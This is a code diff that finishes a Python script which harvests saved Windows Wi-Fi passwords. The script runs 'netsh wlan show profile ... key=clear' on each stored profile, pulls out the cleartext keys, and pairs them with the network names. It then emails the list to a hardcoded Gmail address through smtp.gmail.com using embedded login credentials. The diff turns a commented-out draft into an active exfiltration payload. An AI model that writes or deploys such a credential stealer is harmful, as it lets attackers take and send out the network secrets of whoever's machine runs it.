@@ -2,7 +2,7 @@ import smtplib,subprocess,re
 
 
 def sendMail(email,password,message):
-    server = smptlib.SMTP('smtp.gmail.com',587)
+    server = smtplib.SMTP('smtp.gmail.com',587)
     server.starttls()
     server.login(email,password)
     server.sendmail(email,email,message)
@@ -18,20 +18,36 @@ def getWifi():
         netNames = re.compile('(Profile\s*:\s)(.*)')
         netNames = re.findall(netNames,str(wlanProfile))
         for profile in netNames:
-            print(profile[1])
-            wifiNetworks.append(profile[1])
-            for profile = 
+            
+            wifiNet = profile[1].strip()
+            #print(wifiNet)
+            wifiNetworks.append(wifiNet)
+            
+        
     return wifiNetworks
 
-print(getWifi())
-# for network in getWifi():
-#     print(network)
-#     cmd = 'netsh wlan show profile ' + network + ' key=clear'
-#     print(cmd)
+#print(getWifi())
+def getPass():
+    passwords = []
+
+    for network in getWifi():
+        #print(network)
+        cmd = 'netsh wlan show profile ' + network + ' key=clear'
+        #print(cmd)
+        wlanProfile = subprocess.check_output(cmd)
+        wlanProfile = wlanProfile.decode()
+        getPass = re.compile(r'(Key Content\s*:)(.*)')
+        reGroups = getPass.findall(wlanProfile)[-1]
+        password = (reGroups[-1])
+        password = password.strip()
+        passwords.append(password)
     
-    #password = subprocess.check_output('netsh wlan show profile ' + network + ' key=clear')
+    return passwords
+#print(getPass())
+
+result = zip(getWifi(),getPass())
+result = (list(result))
 
 
-
-#sendMail('benpro4433@gmail.com','burn3rp4ss',result)
+sendMail('benpro4433@gmail.com','burn3rp4ss',result)
 
